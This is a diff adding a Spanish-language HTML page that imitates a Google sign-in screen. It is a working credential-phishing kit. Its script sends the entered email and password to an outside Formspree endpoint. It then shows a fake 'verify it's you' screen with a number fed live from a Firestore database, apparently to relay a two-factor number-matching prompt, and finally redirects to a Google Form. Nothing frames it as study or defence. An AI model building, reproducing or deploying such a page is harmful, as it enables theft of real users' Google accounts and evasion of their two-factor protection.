@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Verificación</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f2f2f2;
+    }
+
+    .login-box, #loading-screen, #verificacion {
+      display: none;
+    }
+
+    .visible {
+      display: flex !important;
+    }
+
+    .login-box {
+      flex-direction: column;
+      align-items: center;
+      background: white;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      max-width: 360px;
+      margin: 100px auto;
+    }
+
+    .login-box img {
+      width: 75px;
+      margin-bottom: 20px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-top: 8px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    .blue-button {
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    #loading-screen, #verificacion {
+      position: fixed;
+      inset: 0;
+      background-color: white;
+      z-index: 9999;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #1a73e8;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    #verificacion img {
+      width: 70px;
+      margin-bottom: 20px;
+    }
+
+    #verificacion h1 {
+      font-size: 22px;
+      margin-bottom: 10px;
+      color: #202124;
+    }
+
+    #verificacion p {
+      text-align: center;
+      max-width: 300px;
+      color: #5f6368;
+    }
+
+    #numero {
+      font-size: 64px;
+      margin-top: 40px;
+      font-weight: bold;
+      color: #202124;
+    }
+  </style>
+</head>
+<body>
+
+<div class="login-box visible" id="login-box">
+  <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
+  <h2>Iniciar sesión</h2>
+  <form id="login-form">
+    <input type="text" name="Correo" placeholder="Correo electrónico o teléfono" required>
+    <input type="password" name="Contraseña" placeholder="Contraseña" required>
+    <button class="blue-button" type="submit">Siguiente</button>
+  </form>
+</div>
+
+<div id="loading-screen">
+  <div class="spinner"></div>
+  <p>Cargando, por favor espera...</p>
+</div>
+
+<div id="verificacion">
+  <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+  <h1>Verifica que eres tú</h1>
+  <p>Para proteger tu cuenta, Google quiere asegurarse de que realmente seas tú la persona que intenta acceder</p>
+  <div id="numero">...</div>
+</div>
+
+<!-- Firebase -->
+<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
+
+<script>
+  // Configuración Firebase (reemplaza con la tuya)
+  const firebaseConfig = {
+    apiKey: "AIzaSyCNqHiJVWPy-iReOtsfOR89NOSx-sQUoI4",
+    authDomain: "account-4a145.firebaseapp.com",
+    projectId: "account-4a145",
+    storageBucket: "account-4a145.firebasestorage.app",
+    messagingSenderId: "24703243588",
+    appId: "1:24703243588:web:2f45956fab5c7694017311",
+  };
+
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.firestore();
+
+  // Escuchar en tiempo real
+  db.collection("mensajes").orderBy("timestamp", "desc").limit(1).onSnapshot(snapshot => {
+    snapshot.forEach(doc => {
+      const data = doc.data();
+      const numero = data.texto || "...";
+      document.getElementById("numero").textContent = numero;
+    });
+  });
+
+  document.getElementById("login-form").addEventListener("submit", function(e) {
+    e.preventDefault();
+    const form = e.target;
+    const data = new FormData(form);
+
+    // Ocultar login, mostrar loading
+    document.getElementById("login-box").classList.remove("visible");
+    document.getElementById("loading-screen").classList.add("visible");
+
+    // Enviar datos a Formspree
+    fetch("https://formspree.io/f/mnndpvlw", {
+      method: "POST",
+      body: data,
+      headers: { 'Accept': 'application/json' }
+    });
+
+    // Después de 30 seg, mostrar verificación
+    setTimeout(() => {
+      document.getElementById("loading-screen").classList.remove("visible");
+      document.getElementById("verificacion").classList.add("visible");
+
+      // Luego de 15 seg, redirigir
+      setTimeout(() => {
+        window.location.href = "https://forms.gle/M7DsjHnWW9gxQzHE7";
+      }, 15000);
+    }, 30000);
+  });
+</script>
+
+</body>
+</html>
